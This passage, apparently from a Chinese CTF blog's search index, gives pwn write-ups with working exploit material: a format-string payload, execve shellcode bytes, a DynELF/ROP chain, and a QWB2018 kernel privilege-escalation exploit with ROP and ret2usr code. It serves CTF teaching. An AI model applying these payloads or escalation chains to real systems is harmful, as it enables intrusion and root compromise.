https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9\ntar -zxvf pip-9.0.1.tar.gz\ncd pip-9.0.1\npython2 setup.py install\nln -s /usr/local/python27/bin/pip2.7 /usr/bin/pip2\n```\n\n6.安装pwndbg三部曲:\n\n```\n#注释头\n\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n```\n\n7.添加pwngdb:\n\n```\n#注释头\n\ncd ~\ngit clone https://github.com/0xKira/pwngdb.git\nvim ~/.gdbinit\n#将peda注释，添加：(必须加在第一行)\nsource ~/pwndbg/gdbinit.py\n```\n\n8.安装pwntools一步曲：\n\n```\n#注释头\n\npip2 install pwntools\npip3 install pwntools\n```\n\n三、准备源码：\n\n```\n#注释头\n\nhttp://ftp.gnu.org/gnu/glibc/\n```\n\n挂飞机下gz包老快了，找到里面的malloc.c准备开始阅读。\n\n四、跟着CTFwiki一步步调试：\n\nhttps://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/\n\n五、视频调试：\n\nhttps://www.bilibili.com/video/BV1q5411h7Wf\n\n \n\n \n\n \n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN"]},{"title":"MMA CTF 2nd 2016-greeting","url":"/2021/08/14/MMA CTF 2nd 2016-greeting/","content":"\n1.常规checksec，开了canary和NX。IDA打开找漏洞，main函数中格式化字符串漏洞：\n\n```\n#注释头\n\n\nchar v5; // [esp+5Ch] [ebp-44h]\nchar s; // [esp+1Ch] [ebp-84h]\n-----------------------------------------------------\nif ( !getnline(&v5, 64) )\nsprintf(&s, \"Nice to meet you, %s :)\\n\", &v5);\nreturn printf(&s);\n```\n\n2.再找system，有导入，没有binsh，没有Libc。用格式化字符串修改某个函数的got表指向system函数，然后再次运行程序得以输入binsh传给该函数，相当于调用system函数，之后就可以getshell。但是发现该程序中没有循环，修改之后没办法再次输入。\n\n3.这里需要用到c语言的结构执行：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541317.png)\n\nc语言编译后，执行顺序如图所示，总的来说就是在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。\n\n4.利用Main函数结束时会调用fini段的函数组这一个特点，我们尝试找到fini函数组的地址，利用格式化字符串漏洞来修改该地址，修改.fini_array数组的第一个元素为start，使得Main函数退出时运行该地址可以重复回到start来再次执行一次输入。\n\n5.fini_array段的地址直接ctrl+s就可以找到，内容是__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux，保存的内容是一个地址，该地址对应是一个代码段，该代码段的函数名为__do_global_dtors_aux proc near。其它函数对应的got,plt可以通过elf.pot\\\\elf.plt对应的来搜索。\n\n6.但是这里存在一个问题，要将什么地址劫持为system函数？这个地址必须是在getline最后或者是之后，而且还需要有参数来执行binsh。第一个想到的是sprintf，因为该函数在getline函数之后，并且从右往左数第一个参数就是我们保存的内容，但是尝试过后发现崩溃了，修改是能修改，但是传参的时候有点问题。后面查看该函数汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541342.jpeg)\n\n可以看到查看该函数从栈上取的第一个参数应该是s这个数组，而不是我们穿的v5，而如果劫持为system函数，那么就要求栈上的esp指向的内容的地址是binsh字符串，但是这里确实指向s这个数组中的内容，为空，那么system函数就没办法调用成功了。后面又看printf函数，还是不行，因为这里printf函数的参数也是s这个数组，内容此时为空，无法顺利调用。之后再找，经过getnline函数内部可以发现有个strlen函数：\n\n```\n#注释头\n\n#代码中的形式：\nif ( !getnline(&v5, 64) )\n----------------------------------------------------------------\ngetnline(char *s, int n)\nreturn strlen(s);\n\n#该函数原型：\nunsigned int strlen(const char *str);\n-------------------------------------------------------\n#system函数原型：\nint system(const char *command); \n```\n\nsystem函数调用规则是需要一个地址，地址上保存的内容是binsh字符串，或者直接\"binsh\"字符串赋予，C语言中就代表在全局变量中开辟一块内存，然后该内存保存的是binsh字符串，然后将该内存的地址赋予给system函数当作参数运行。总之就是system函数需要的参数是一个地址。\n\n这里的strlen满足这个条件，虽然上面写的只是s，但是s中保存的内容是一个地址，输入AAAA，通过调试查看内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540223.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540170.jpeg)\n\n同样的，查看下汇编代码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540150.jpeg)\n\n可以看到[esp+s]相当于是取s的栈地址赋值给eax，然后eax赋值给esp栈顶，这两行破代码有病，一毛一样。所以现在跳转进strlen中的话，esp的值也就是参数，是一个栈上地址，内容就是AAAA。也就相当于在strlen中的s的值是一个地址，那么劫持后，就相当于system(s)，同样可以getshell。\n\n▲劫持为system函数，要求原函数的参数也应该是一个地址才行，不然无法跳转。\n\n7.确定攻击思路后，开始计算偏移，先用IDA简单远程调试，输入AAAA，然后将程序一直运行至printf处，可以看到栈中的偏移为12.5处会出现A的ascii值，也就是41。由于我们需要栈中完整的对应地址，所以需要输入aa填充两个字节，来使得偏移量从12.5到13处，从而能够完整地输入我们需要修改的地址。\n\n8.之后编写payload，这里使用控制字符%hn(一次改动两个字节)来修改：\n\npayload = ‘aa’+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(格式化fini+2) + str(格式化fini) + str(格式化strlen_got+2) + str(格式化strlen_got)\n\n9.之后还得确定输出的值：\n\n```\n#注释头\n\nfini_array = 0x08049934\nstart_addr = 0x080484f0\nstrlen_got = 0x08049a54\nsystem_plt = 0x08048490\n```\n\n查看代码，由于sprintf的作用，printf的参数s保存的不止有我们输入的，还有Nice to meet you,计算加上aa可得总共有8f-7c+1=0x14个，再加上三个32位的地址12字节，总共32字节，也就是0x20。(计算截至为 str(格式化fini+2)处)\n\n10.另外由于.fini_array的内容为0x080485a0(按d可查看数据)，而我们需要更改的start地址为0x080484f0，所以只需要改动大端序列中的85a0变成84f0即可。所以格式化.fini中需要再输出的字节数应该是0x84f0-0x20=0x84D0=34000。而0x08049934+2处的内容本身就是0804，不需要修改。所以只需要修改.fini_array_addr对应的内容即可，(.fini_array+2对应的内容本身就是0804，不用修改)。所以payload可以删去p32(fini_array_addr+2)和str(格式化fini+2)。\n\n11.接着计算，需要将strlen_got+2处的值改成0804，由于之前已经输出了0x84f0所以需要用到数据截断。也就是格式化内容中需要再输出的字节数为0x10804-0x84f0=0x8314=33556。\n\n然后再计算strlen_got的值，需要再输出0x18490-0x10804=0x7c8c=31884。\n\n故都计算完毕，最后payload为：\n\npayload = ‘aa’ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + ’%34000c%12$hn’ + ‘%33556c%13$hn’ + ‘%31884c%14$hn’\n\n12.payload之后，运行完第一次的printf之后，程序会回到start，之后需要再输入字符串io.sendline('/bin/sh\\x00')来完整运行system，从而getshell。\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"Openctf 2016-tyro_shellcode1","url":"/2021/08/14/Openctf 2016-tyro_shellcode1/","content":"\n \n\n1.常规checksec，开了Canary和NX，IDA查找漏洞，找到下列奇怪代码：\n\n```\n#注释头\n\nv4 = mmap(0, 0x80u, 7, 34, -1, 0);\n-----------------------------------------------------------------------------\nread(0, v4, 0x20u);\nv5 = ((int (*)(void))v4)();\n```\n\n可以猜出来是输入到v4中，然后v4被强制转换成函数指针被调用。查看汇编代码也可以看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191554098.jpeg)\n\n这里就没办法判断到底[esp+34h]是不是v4了，因为v4是通过mmap申请的一块内存，虽然在栈上，但是并不知道在哪，需要通过调试才能知道，调试之后发现确实是这样。\n\n2.虽然最开始checksec程序，发现开了NX，那么这不就代表没办法shellcode了吗。调试也发现，除了代码段，其它段都没有X属性，都不可执行。但是我们看汇编代码，是call eax，调用的是寄存器，不是程序段，一定可以被调用的，然后eax中保存的内容就是我们输入的内容啊，所以直接输入shellcode就完事，连栈溢出什么的都不用考虑。\n\n3.那么直接从http://shell-storm.org/shellcode/\n\n查找获取就可以。给出一段可用shellcode:\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n\n \n\n由于这段shellcode调用的是int80来获取shell的，所以给出下列介绍\n\n▲int 80h：128号中断\n\n1.在32位Linux中该中断被用于呼叫系统调用程序system_call()。\n\n2.read(), write(), system()之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。\n\n3.输入的shellcode也就汇编成了EAX = 0Xb = 11，EBX = &(“/bin//sh”), ECX = EDX = 0，等同于执行代码sys_execve(\"/bin//sh\", 0, 0, 0)，通过/bin/sh软链接打开一个shell。这里sys_execve调用的参数就是ebx的对应的地址。所以我们可以在没有system函数的情况下打开shell。64位linux系统的汇编指令就是syscall，调用sys_execve需要将EAX设置为0x3B，放置参数的寄存器也和32位不同\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"PlaidCTF 2013 ropasaurusrex","url":"/2021/08/14/PlaidCTF 2013 ropasaurusrex/","content":"\n1.常规checksec，只开启了一个NX，不能使用shellcode，IDA分析漏洞，程序的sub_80483F4()函数栈溢出：\n\n```\n#注释头\n\nchar buf; // [esp+10h] [ebp-88h]\n------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n有write函数，没有libc，got表里没有system，也没有int 80h/syscall，没有binsh字符串。\n\n2.这种情况下我们就可以使用DynELF来leaklibc，进而获取system函数在内存中的地址，然后就可以再用read函数来读取字符串。\n\n3.首先编写leak函数，也就是需要调用write函数打印需要泄露的地址\n\n常规的leak函数模式：\n\n```\n#注释头\n\ndef leak(addr):\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #调用write\n    payload += p32(start_addr) #write返回到start\n    payload += p32(1) #write第一个参数fd\n    payload += p32(addr) #write第二个参数buf\n    payload += p32(8) #write第三个参数size\n    io.sendline(payload)\n    content = io.recv()[:8] #接受内容读取通过write打印的地址\n    print(\"%#x -> %s\" %(addr, (content or '').encode('hex')))\n    #这里打印不需要也可以，只是可以打印出来让我们看到write打印了什么地址，基本都打印了\n    return content\n    #这里return的conten有很多地址，需要通过之后的DynELF来lookup对应的地址\n```\n\n这里的write函数可以换成put或者printf函数，但是如果改变了，那么后面的参数个数也需要发生改变，对应打印函数的形式：\n\n```\n#注释头\n\nssize_t write(int fd,const void *buf,size_t count);\nint puts(const char *s)\nint printf(const char*format, ......)；\n```\n\n具体请参考：\n\nhttps://www.anquanke.com/post/id/85129\n\n4.接下来就需要创建DynELF类来使用\n\n```\n#注释头\n\nd = DynELF(leak, elf = elf)\n#创建DynELF类，传入需要泄露的地址，从elf文件中获取\nsystem_addr = d.lookup('system', 'libc')\n```\n\n5.找到system_addr之后，就可以通过再次利用栈溢出来读取字符串，因为之前write的返回地址已经是最开始的start地址。再次运行到read函数读取第二次的payload，组成为：\n\n```\n#注释\n\npayload = padding\npayload += read_addr #覆盖eip，将sub_80483F4函数的返回地址劫持到read函数)\npayload += system_addr #使得read函数的返回地址为system)\npayload += p32(fd) #read函数的第一个参数，同时也对应system函数的返回地址\npayload += p32(binsh_addr) #read函数读取进binsh的地址，同时也对应system函数的参数\npayload += p32(size) #read函数的第三个参数，读取的字符串大小，于system函数无实际意义，但是如果system函数返回了，那么这就是返回之后的eip，下一条执行的代码地址。\n```\n\n6.程序总流程如下：\n\n由于第一段Payload最后write调用后返回到了start，所以又调用sub_80483F4函数，进入读取界面，需要输入第二段payload栈溢出，劫持sub_80483F4函数的返回地址eip为read函数地址，从而进入read函数。之后再次劫持read函数的返回地址为system函数，并且将read的第二个参数，也就是读取进的binsh字符串也传入system函数，从而getshell。\n\n \n\n \n\n▲call _read函数和直接调用read_plt的区别：\n\n1.call _read函数会push eip，会使得栈中结构从我们原本设置好的：\n\n```\n#注释头\n\npadding\n(call read_addr)_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n变成:\n\n```\n#注释头\n\npadding\n(call read_addr)_addr\n(call read_addr)_addr下一条指令\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n这个eip没办法改变，因为是call这个指令带来的，这样就会导致在read函数没办法正常读取参数，如果去掉system_addr，又会导致返回到call指令下一条leave要执行时，ebp会指向一个padding，这是在read函数中变成的，从而导致leave指令也出错。\n\n2.但是如果直接调用read_plt，栈中结构为：\n\n```\n#注释头\n\npadding\nread_plt_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\n这样Read函数读取完之后，返回时就会直接调用system_addr，完全不用管ebp变成了什么，同时这里也可以直接将binsh_addr传给system，一举两得。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Dynelf"],"categories":["PWN","Dynelf0x5"]},{"title":"QWB2018-core","url":"/2021/08/14/QWB2018-core/","content":"\n一、使用Kernel_ROP\n\n1.首先解包，查看init设置：\n\n```\n#注释头\n\n#!/bin/sh\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2\ninsmod /core.ko\n\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0 -f\n```\n\n注意三个地方：\n\n```\n//注释头\n\necho 1 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /tmp/kallsyms ------------------------------------------------------------ \ninsmod /core.ko \n------------------------------------------------------------- \nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n```\n\n(1)把/proc/kallsysm拷贝到tmp文件夹下一份，而kallsysm中保存了加载内核之后几乎所有的函数调用：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508732.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508526.jpeg)\n\n由于被kptr_restrict设为 1，这样就不能通过 /proc/kallsyms查看函数地址了，但是这里把kallsysm拷贝到了tmp文件夹下，那么就可以从tmp文件夹下的kallsysm找到所有需要的地址，包括gadget。\n\n(2)insmod /core.ko，挂载了目录下的core.ko驱动程序，通常这个驱动程序就是漏洞的所在点，用IDA打开分析。\n\n(3)setsid /bin/cttyhack setuidgid 1000 /bin/sh，这个就是设置用户权限了，1000为权限ID，如果设置为0就是root权限了，为了调试，可以先设置成0方便点。\n\n2.再看下start.sh启动qemu的设置：\n\n```\n#注释头\n\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./core.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\n可以看到加载了core.ko驱动，并且开启了kaslr。\n\n3.然后分析下core.ko代码，漏洞点在core_copy_func函数和core_write函数：\n\n```\n#注释头\n\n#core_write函数：\nif ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )\n\n\n#core_copy_func函数：\n__int64 v2; // [rsp+0h] [rbp-50h]\n-------------------------------------------------------\nif ( a1 > 63 )\n{\n   printk(&unk_2A1);\n   result = 0xFFFFFFFFLL;\n}\nelse\n{\n    qmemcpy(&v2, &name, (unsigned __int16)a1);\n}\n```\n\n(1)name是全局变量，core_write函数从用户空间拷贝了v3长度到name中，而core_write函数可以通过exp中调用write，write(core_fd, data, 0x800);打开该驱动从而调用驱动中的core_write函数，将我们的data写入到name中。\n\n(2)之后由于core_copy_func函数可以通过ioctl函数直接传参调用，所以其中的a1受到我们控制，然后对a1的检查又只有一个if(a1>63)，存在整数转换的漏洞，也就是如果a1为负数，就能够通过if语句，那么通过qmemcpy(&v2, &name, (unsigned __int16)a1);函数的隐形转换，就可以从name拷贝很大的数据到v2上，而v2在内核栈上，那么就可以对内核栈进行栈溢出。\n\n4.可以构造rop链尝试了，但是这里还有一个canary，Leak漏洞在core_read和ioctl函数上：\n\n```\n#注释头\n\n#core_read函数：\n__int64 v5;\n--------------------------------------------------------\nresult = copy_to_user(v1, (char *)&v5 + off, 64LL);\n\n#ioctl函数：\ncase 0x6677889C:\n    printk(&unk_2CD);\n    off = v3;\n    break;\n```\n\noff是全局变量，可以通过调用ioctl函数来设置。v5是core_read内核函数栈上的变量，可以使得off适当大一些，从而泄露出canary。\n\n5.现在尝试构造exp：\n\n(1)首先找地址：\n\n```\n//注释头\n\n//找到内核加载基地址vmlinux_base和prepare_kernel_cred函数、commit_creds函数地址\nsize_t find_symbols()\n{\n    FILE* kallsyms_fd = fopen(\"/tmp/kallsyms\", \"r\");\n    if(kallsyms_fd < 0)\n    {\n        puts(\"[*]open kallsyms error!\");\n        exit(0);\n    }\n\n    char buf[0x30] = {0};\n    while(fgets(buf, 0x30, kallsyms_fd))\n    {\n        if(commit_creds & prepare_kernel_cred)\n            return 0;\n\n        if(strstr(buf, \"commit_creds\") && !commit_creds)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            /* printf(\"hex: %s\\n\", hex); */\n            sscanf(hex, \"%llx\", &commit_creds);\n            printf(\"commit_creds addr: %p\\n\", commit_creds);\n            vmlinux_base = commit_creds - 0x9c8e0;\n            printf(\"vmlinux_base addr: %p\\n\", vmlinux_base);\n            \n        }\n\n        if(strstr(buf, \"prepare_kernel_cred\") && !prepare_kernel_cred)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            sscanf(hex, \"%llx\", &prepare_kernel_cred);\n            printf(\"prepare_kernel_cred addr: %p\\n\", prepare_kernel_cred);\n            vmlinux_base = prepare_kernel_cred - 0x9cce0;\n            /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */\n        }\n    }\n\n    if(!(prepare_kernel_cred & commit_creds))\n    {\n        puts(\"[*]Error!\");\n        exit(0);\n    }\n}\n```\n\n这里的0x9c8e0和0x9cce0都是通过ROPgadget查找vmlinux找出来的，不过找到的地址是相对偏移加上了0xffffffff81000000，所以这里需要减去得到相对偏移。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508584.jpeg)\n\n(2)然后泄露canary:\n\n```\n//注释头\n\nvoid core_read(int fd, char *buf)\n{\n    puts(\"[*]read to buf.\");\n    ioctl(fd, 0x6677889B, buf);\n}\n----------------------------------------------------------------------\nvoid set_off(int fd, long long idx)\n{\n    printf(\"[*]set off to %ld\\n\", idx);\n    ioctl(fd, 0x6677889C, idx);\n}\n---------------------------------------------------------------------\nset_off(fd, 0x40);\n\nchar buf[0x40] = {0};\ncore_read(fd, buf);\nsize_t canary = ((size_t *)buf)[0];\nprintf(\"[+]canary: %p\\n\", canary);\n//这里fd为int fd = open(\"/proc/core\", 2);\n```\n\n(3)构造rop链：\n\n```\n//注释头\n\nssize_t offset = vmlinux_base - 0xffffffff81000000;\nsize_t rop[0x1000] = {0};\nfor(int i = 0; i < 10; i++)\n{\n    rop[i] = canary;\n}\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss;\n```\n\n这里rop链构造一般分为\n\n①覆盖返回地址，执行commit_creds(prepare_kernel_cred(0) )函数，提权，即：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\n②通过swapgs和iretq返回用户态：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n```\n\n▲这里的swapgs和iretq最好用objdump -d vmlinux > gadget来保存寻找，如果用ROPgadget或者ropper可能不识别，从而无法找到。\n\n③着陆开shell：\n\n```\n//注释头\n\n\nvoid spawn_shell()\n{\n    if(!getuid())\n    {\n\tsystem(\"/bin/sh\");\n    }\n    else\n    {\n\tputs(\"[*]spawn shell error!\");\n    }\n    exit(0);\n}\n----------------------------------------------------\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss; // ss\n```\n\n(4)最后输入rop链，提权执行：\n\n```\n//注释头\n\nvoid core_copy_func(int fd, long long size)\n{\n    printf(\"[*]copy from user with size: %ld\\n\", size);\n    ioctl(fd, 0x6677889A, size);\n}\n--------------------------------------------------------------\nwrite(fd, rop, 0x800);\ncore_copy_func(fd, 0xffffffffffff0000 | (0x100));\n```\n\n▲需要注意的是在程序进入内核态之前需要保存下用户态的参数，不然之后没办法返回用户态开shell：\n\n```\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        );\n    puts(\"[*]status has been saved.\");\n}\n```\n\n \n\n二、使用Ret2usr技术：\n\n1.在这道题中与ROP差不多，唯一的区别在于提权的时候：\n\n(1)ROP技术中，利用思想和常规pwn题一样，rdi传参之后寻找Gadget来调用commit_creds(prepare_kernel_cred(0))。\n\n(2)Ret2Usr技术中，由于我们是直接运行我们的二进制文件exp，所以在exp文件内声明定义的函数会被加载到exp的进程中，可以直接在exp中调用，不需要rop。但是这里如果直接调用system(\"/bin/sh\")没什么用，权限仍然不是root，还是需要调用commit_creds(prepare_kernel_cred(0))提权才行，所以这里就可以利用泄露出来的地址直接构造该函数调用即可，而不用再rop来调用了。\n\n就相当于将以下代码替换一下：\n\n```\n//注释头\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\n替换成：\n\n```\n//注释头\n\nrop[i++] = (size_t)get_root;\n------------------------------------------------\n//函数定义为：\nvoid get_root()\n{\n    char* (*pkc)(int) = prepare_kernel_cred;\n    void (*cc)(char*) = commit_creds;\n    (*cc)((*pkc)(0));\n    /* puts(\"[*] root now.\"); */\n}\n```\n\n最开始我想为什么不直接运行调用，后面才知道是特权模式问题。如果直接调用，就会出现访问错误，因为我们构造的函数的函数地址是在内核空间中，而用户空间是无法运行内核空间的函数。所以需要调用write(fd, rop, 0x30 * 8);进入到内核空间，获得特权模式下ring0的权限，然后运行用户空间的get_root()函数，再进入到内核空间寻找对于的commit_creds函数和prepare_kernel_cred(0)结构体，从而提权。\n\n \n\n \n\n \n\n \n\n参考资料:\n\nctfwiki\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernel题"],"categories":["pwn-kernel","Kernel-ROP","Kernel-Ret2Usr"]},{"title":"ROP汇总","url":"/2021/08/14/ROP汇总/","content":"\n一、32位ROP：\n\n1.如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：\n\nsystem函数-system函数的返回地址-sytem函数的参数。\n\n2.但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：\n\ncall system函数地址-system函数参数。\n\n(两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)\n\n \n\n二、64位ROP：\n\n需要传参指令：pop rdi;ret。这里就不用管是plt还是call了，因为传参是rdi传参，返回地址是啥都没关系，多参数的需要万能gadget。\n\n▲64位程序中函数取参数是取rdi中内容指向的内存中的内容，相当于*rdi，同样的32位程序中取参是取栈上的内容指向的内存中的内容，相当于*[ebp+var_0xh]，所以直接输入binsh字符串来赋值给rdi或者赋值给函数参数肯定是不行的，因为这不是一个有效的地址，而是字符串的二进制形式。\n\n \n\n三、万能gadget\n\n1.传入got表和plt表的区别：\n\n万能gadget中调用我们想调用的函数为call qword ptr[r12+rbx*8]，硬编码为FF，是取r12中保存的内容当作一个地址a，这个地址a保存的内容应该是一个地址b，该地址b指向的地方才是可以被执行的实际代码位置。\n\n例如:\n\n```\n#注释头\n\nr12:    got_a\ngot_a:  0x111\n0x111:  mov a b\n```\n\n所以call qword ptr[r12+rbx*8]实际执行跳转到的位置是0x111，而执行的代码是mov a b;只能传入got表，如果传入plt表，那么应该如下：\n\n```\n#注释头\n\nr12:          plt_a\nplt_a:        jmp got_a\njmp got_a:    无效编码地址\n#这个jmp got_a转换成硬编码就不是一个有效地址\n```\n\n2.不同的call区别：\n\nFF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。\n\nE8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。\n\n▲普通call，EB编码：call fun_c(最常用的)\n\nfun_c： mov a b\n\n相当于直接跳转到fun_c这个地址来执行代码\n\n \n\n \n\n四、main函数返回的ROP：\n\n1.最开始启动程序时，main函数栈不是汇编代码写的那么大，而应该再大两个0x04用来存放全局偏移，所以计算偏移时就需要再加上两个0x04\n\n2.通过再次进入main函数中之后，程序只会依照汇编代码来构造Mainh函数栈，所以这一次里的main函数栈中就没有全局偏移的东西了，正常计算偏移。\n\n \n\n \n\n五、技巧性：\n\n1.通过覆盖返回地址调用函数时，可以注意上一个函数栈中的esp的位置，然后直接通过Pop等操作继续往下retn到输入的payload中的函数地址。(RedHat 2017-pwn1)\n\n2.rop主要是找system函数和binsh字符串，没有的话其实用int80可以代替system，然后sh\\bash什么的也可以代替binsh字符串。\n\n3.使用int80的话需要设置寄存器，同样如果有其它可以用到的系统调用，可以通过：\n\nhttp://syscalls.kernelgrok.com/ 这个来查找\n\n4.onegadget需要条件满足，可以直接查：one_gadget libc文件，然后通过调试或者IDA看汇编，观察到达调用onegadget的时候条件满不满足。\n\n5.查找：\n\n```\n#注释头\n\none_gadget libc_so.6\nROPgadget --binary file | grep \"pop eax ; pop ebx ; pop esi ; pop edi ; ret\"\n```\n\n \n\n \n\n \n\n \n\n总结：\n\n所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。\n\n需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。\n\n需要打印真实函数地址时，传的一定是got表，这样就一定没错。\n\n当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。\n\n \n\n1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。\n\n2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。\n\n3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。\n\n4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以\n","tags":["Fmstr"],"categories":["PWN","ROP0x3"]},{"title":"RedHat 2017-pwn1","url":"/2021/08/14/RedHat 2017-pwn1/","content":"\n 